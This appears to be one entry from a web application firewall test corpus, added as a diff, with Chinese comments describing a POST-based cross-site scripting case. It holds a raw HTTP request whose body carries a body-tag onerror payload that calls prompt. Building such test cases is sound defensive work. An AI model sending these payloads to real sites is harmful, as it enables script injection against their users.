@@ -1,0 +1,10 @@
+# XSS跨站脚本_POST_常规_事件_body标签_onerror事件-06506858
+# 在网页的<body>标签中，通过设置onerror事件处理程序，将执行恶意JavaScript代码。当资源加载失败或导致错误时触发，使用post方式注入
+POST /?bid=hd_tag_m8mv24xu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24xu
+RM-PRO-Token: d5359f5e74d0d094946d0d928e00dd44
+RM-PRO-Time: 1742808422645
+User-Agent: curl/7.83.1
+
+id=<body onerror=prompt("xss") onload=/>
